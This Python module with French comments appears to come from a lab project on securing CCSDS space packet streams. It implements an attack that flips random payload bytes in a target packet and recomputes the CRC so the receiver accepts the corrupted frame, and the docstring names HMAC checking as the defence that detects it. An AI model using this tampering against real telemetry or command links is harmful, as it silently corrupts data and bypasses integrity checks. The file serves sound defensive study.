# =============================================================
# fuzz_payload.py – Attaque 2 / Vecteur 3 : Fuzzing du payload
#
# Introduit des inversions de bits aléatoires dans le payload
# d'un paquet CCSDS, puis recalcule le CRC pour que le
# récepteur accepte la trame corrompue sans le savoir.
# =============================================================

import random
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from src.receiver.frame_parser import parse_stream
from src.attacks._utils import rebuildPacket, offsetInStream


def fuzzPayload(
    rawStream: bytes,
    targetSeq: int,
    numFlips: int = 1,
    verbose: bool = True,
) -> bytes:
    """
    Applique des inversions de bits aléatoires dans le payload d'un paquet.

    Simule une attaque où l'adversaire corrompt les données utiles
    (mesures, images, commandes) de façon non détectable par le seul CRC,
    car le CRC est recalculé après la corruption.

    Args:
        rawStream:  Flux de paquets CCSDS bruts.
        targetSeq:  seqCount du paquet à corrompre.
        numFlips:   Nombre d'octets à inverser (défaut : 1).
        verbose:    Afficher un log de l'altération.

    Returns:
        Flux modifié avec payload corrompu et CRC recomputed.

    Détection (Défense 2) :
        → HMAC_FAIL : le contenu altéré ne correspond plus au tag HMAC
    """
    packets = parse_stream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset       = offsetInStream(packets, targetSeq)
        fuzzed       = bytearray(pkt["payload"])
        flippedAt    = []

        for _ in range(min(numFlips, len(fuzzed))):
            pos       = random.randint(0, len(fuzzed) - 1)
            fuzzed[pos] ^= random.randint(1, 0xFF)
            flippedAt.append(pos)

        newPkt = rebuildPacket(
            apid       = pkt["apid"],
            seqFlags   = pkt["seqFlags"],
            seqCount   = pkt["seqCount"],
            version    = pkt["version"],
            packetType = pkt["packetType"],
            secHdrFlag = pkt["secHdrFlag"],
            payload    = bytes(fuzzed),
        )
        result[offset : offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(
                f"[A2/fuzzPayload] seqCount={targetSeq} : "
                f"{numFlips} flip(s) aux positions {flippedAt}  (CRC recomputed)"
            )
        break

    return bytes(result)
